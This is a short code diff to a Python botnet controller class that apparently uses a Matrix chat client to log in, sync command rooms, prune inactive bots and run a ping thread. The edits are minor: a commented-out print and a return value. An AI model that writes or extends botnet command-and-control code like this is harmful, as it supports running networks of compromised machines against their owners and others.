@@ -126,7 +126,7 @@ class BotnetController:
         # login and sync
         try:
             self.access_token = self.client.login(username=USER_NAME, password=PASSWORD)
-            print("[+] Logged in as controller.")
+            # print("[+] Logged in as controller.")
         except MatrixRequestError as e:
             print(e)
             if e.code == 403:
@@ -261,7 +261,7 @@ class BotnetController:
                 for room in self.command_rooms.values():
                     room.delete_inactive_bots()
                     
-    def run(self):
+    def run(self) -> bool:
         self.login()
         self.sync_rooms()
         
@@ -269,5 +269,6 @@ class BotnetController:
         self.client.start_listener_thread()
         
         threading.Thread(name="PING THREAD", target=self.ping_loop, daemon=True).start()
+        return True
         
         
